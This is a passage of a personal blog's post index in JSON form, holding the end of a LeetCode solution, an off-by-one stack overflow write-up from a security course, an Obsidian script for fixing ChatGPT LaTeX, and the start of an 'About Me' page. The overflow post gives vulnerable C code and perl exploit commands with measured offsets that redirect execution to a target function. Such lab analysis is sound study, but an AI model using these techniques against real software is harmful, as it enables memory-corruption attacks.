-\u0026gt; int: dp = [[0 for _ in range(len(t) + 1)] for _ in range(len(s) + 1)] for i in range(len(s) + 1): dp[i][0] = 1 for j in range(1, len(t) + 1): for i in range(1, len(s) + 1): if s[i-1] == t[j-1]: dp[i][j] = dp[i-1][j] + dp[i-1][j-1] else: dp[i][j] = dp[i-1][j] return dp[-1][-1] ","date":"2024-10-21T19:39:42Z","permalink":"https://example.org/post/2024/10/leetcode241020/","title":"Leetcode Notes"},{"content":"Off-by-One Overflow Attack Analysis Background Last week, I attended a security course that included an example of an off-by-one overflow vulnerability. Here is the original code:\n/* Simple off-by-one overflow example */ #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; void foo(char *input) { char buf[1024]; strncpy(buf, input, sizeof(buf)); buf[sizeof(buf)] = \u0026#39;\\0\u0026#39;; } void bar(void) { printf(\u0026#34;I\u0026#39;ve been hacked\\n\u0026#34;); } int main(int argc, char **argv) { if (argc != 2) { printf(\u0026#34;Usage: %s input_string\\n\u0026#34;, argv[0]); exit(EXIT_FAILURE); } foo(argv[1]); return 0; } The answer provided for exploiting this vulnerability is:\nperl -e \u0026#39;system \u0026#34;./obo\u0026#34;, \u0026#34;\\x38\\x84\\x04\\x08\u0026#34;x256\u0026#39; The result of running this command is that multiple lines of I've been hacked are printed on the screen.\nAnalysis When the program enters the foo function, the memory layout looks like this (as observed using GDB):\nFrom top to bottom, the layout contains the return address, the saved frame pointer, and the buffer (buf).\nWhen the line buf[sizeof(buf)] = '\\0'; is executed, the least significant byte of the saved frame pointer (ebp) is set to 0. To ensure that ebp still points within the buf region after being partially overwritten, a buffer of at least 1024 bytes is required. Specifically, ebp needs to be overwritten such that it remains within a reasonable range (â€” up to 0xff), which is why the buffer is set to 0xff * 4 bytes.\nUnderstanding Assembly Commands on foo Return When the foo function returns, it typically executes the following key assembly instructions:\n1. leave Instruction The leave instruction is equivalent to:\nmov esp, ebp pop ebp mov esp, ebp: This sets the stack pointer (esp) to the value of the frame pointer (ebp), restoring the stack pointer to the top of the current stack frame and effectively releasing the space occupied by the current function. pop ebp: This pops the value at the top of the stack and assigns it to the frame pointer (ebp), thereby restoring the caller\u0026rsquo;s frame pointer. Essentially, it writes the return address into ebp, meaning it assigns the stack value (usually the caller\u0026rsquo;s frame address) to ebp, restoring the caller\u0026rsquo;s stack frame. The effect of leave is to restore esp to its state before the function was called and to pop the saved ebp. If ebp has been overwritten to point to a special address (such as an address within the buffer), it can result in an incorrect stack pointer location during function return.\n2. ret Instruction The ret instruction pops an address off the top of the stack and jumps to that address:\npop eip If the return address has been overwritten with the address of the bar function, the execution flow will jump to bar, allowing an attacker to run arbitrary code. Essentially, ret pops an address into the instruction pointer (eip) and jumps to that address to continue execution.\nAttack Steps When the command perl -e 'system \u0026quot;./obo\u0026quot;, \u0026quot;\\x38\\x84\\x04\\x08\u0026quot;x256' is executed, the program takes these repeated bytes as the input to ./obo. As the foo function returns, the leave and ret instructions are executed, leading to the return address being overwritten. This causes the program to jump to the bar function, printing the success message multiple times. Further Analysis: Determining Effective Overwrite Locations Stack Frame Layout Explanation During the GDB debugging session, the memory layout for the stack frame of the foo function looks like this:\n0xbfffed10 return address 0xbfffed0c saved frame pointer (ebp) 0xbfffed0b buf[1023] ... 0xbfffed03 buf[1015] 0xbfffed02 buf[1014] 0xbfffed01 buf[1013] 0xbfffed00 buf[1012] ... 0xbfffe90c buf[0] Return address: Located at 0xbfffed10, this is the address that the program will jump to after the foo function finishes executing. Overwriting this address can control the flow of the program and potentially redirect it to malicious code (e.g., the bar function).\nSaved frame pointer (ebp): Stored at 0xbfffed0c, this value is used to restore the calling function\u0026rsquo;s stack frame after foo finishes. In this example, we can see how the off-by-one overflow can overwrite the least significant byte of ebp.\nBuffer (buf): The buffer starts at address 0xbfffe90c and extends to 0xbfffed0b, with buf[0] located at 0xbfffe90c and buf[1023] at 0xbfffed0b. The vulnerable line in the code, buf[sizeof(buf)] = '\\0';, writes a null terminator (\\0) just outside the bounds of this buffer, affecting the saved frame pointer.\nIn the off-by-one overflow scenario, the write operation overwrites the least significant byte of ebp, which is stored at 0xbfffed0c. By manipulating the value of ebp, we can influence the stack behavior when the leave and ret instructions are executed, eventually allowing us to control the program flow and redirect execution to the bar function.\nTo perform a successful attack, it\u0026rsquo;s crucial to determine precisely which bytes need to be overwritten in order to manipulate the control flow effectively. In this example, the overflow occurs when buf[sizeof(buf)] = '\\0' is executed, causing the least significant byte of the saved frame pointer (ebp) to be set to 0. Thus, the value of ebp needs to be adjusted to ensure it points back into the buffer area, allowing the execution to proceed in the desired way and eventually jump to the bar function.\nBased on further analysis and testing, the following insights were obtained:\nTo accurately determine the overwrite location, the value of ebp is crucial. However, obtaining this value is challenging because:\nGDB debugging affects address layout. The length of the input parameter affects the address layout. Under GDB debugging, the layout within the foo function looks like this:\nAfter executing buf[sizeof(buf)] = '\\0';, ebp is modified such that the return address effectively takes the value at ebp + 1, which is the address 0xbfffed00 + 1, or 0xbfffed04.\nThe corresponding offset is at position 255 in buf, meaning the attack can be constructed by filling in the return address only at that specific location. The following command was used for verification in GDB:\nr $(perl -e \u0026#39;print \u0026#34;\\x01\\x01\\x01\\x01\u0026#34;x254 . \u0026#34;\\x38\\x84\\x04\\x08\u0026#34;x1 . \u0026#34;\\x01\\x01\\x01\\x01\u0026#34;x1\u0026#39;) This was verified to work under GDB debugging, with some details to note:\nThe input parameter length must always be 256 bytes; otherwise, the value of ebp will change, as the input parameter occupies stack space, affecting the starting position of the frame and thereby affecting the value of ebp. Padding must use non-zero values such as 0x01, because strncpy will terminate early if it encounters a 0 value. When executing the program directly (i.e., without GDB), the memory layout differs, resulting in a different offset position. Through experimentation, it was found that the offset is at position 235. The corresponding attack command is:\n./obo $(perl -e \u0026#39;print \u0026#34;\\x01\\x01\\x01\\x01\u0026#34;x234 . \u0026#34;\\x38\\x84\\x04\\x08\u0026#34;x1 . \u0026#34;\\x01\\x01\\x01\\x01\u0026#34;x21\u0026#39;) This achieves the desired effect of accurately finding the overwrite location and successfully executing the attack.\n","date":"2024-10-15T14:18:15Z","permalink":"https://example.org/post/2024/10/oboattact-md/","title":"Off-by-One Overflow Attack Analysis"},{"content":"The formulas generated by ChatGPT use the following format:\n\\[ Formula Content \\] However, Obsidian renders formulas using the following format:\n$$ Formula Content $$ When copying a formula from ChatGPT to Obsidian, this difference prevents proper rendering.\nSolution We can create a script for Obsidian to automatically replace the formula format when pasting.\n1. Create the Script We can solve this issue using a plugin in Obsidian.\nIn your vault, create a file named fixlatex.js under the template directory, and input the following content:\nmodule.exports = async (params) =\u0026gt; { const { quickAddApi } = params; // Get clipboard content const clipboardContent = await quickAddApi.utility.getClipboard(); // Check if content was successfully retrieved if (!clipboardContent) { new Notice(\u0026#34;Clipboard is empty or inaccessible.\u0026#34;); return; } const modifiedContent = clipboardContent .replace(/\\\\\\[|\\\\\\]/g, \u0026#39;$$$$\u0026#39;) // Convert \\[ \\] to $$ $$ .replace(/\\\\\\(\\s*|\\s*\\\\\\)/g, \u0026#39;$$\u0026#39;); // Convert \\( \\) to $ // Write the modified content back to the clipboard await navigator.clipboard.writeText(modifiedContent); new Notice(\u0026#34;Clipboard content has been processed and modified!\u0026#34;); }; 2. Set Up the Script in QuickAdd Install the QuickAdd plugin and create a Macro, configuring it as shown below, then save it. The first step in the Macro is to execute our user script fixlatex.js, the second step is to wait for 100 milliseconds, and the third step is to execute the paste action.\n3. Set Sidebar Shortcut in Commander Install the Commander plugin and set up the QuickAdd action we just created as a sidebar shortcut. You can also skip this step and directly use an Obsidian command to execute this action.\n4. Verify the Effect Now, on the ChatGPT webpage (currently there seems to be an issue when clicking the copy button in the app), click the copy button, then in Obsidian, click the sidebar shortcut or manually execute the QuickAdd command. This will copy the content from ChatGPT to Obsidian and automatically convert the LaTeX format.\n","date":"2024-10-14T15:24:21Z","permalink":"https://example.org/post/2024/10/obsidian-latex-fix/","title":"Convert ChatGPT Formula Format to Obsidian-Compatible Format"},{"content":"About Me Written on October 11, 2024, in Dublin, Ireland.\nSelf Introduction Hello everyone, my name is Nansen Li, previously known as Nan Li.
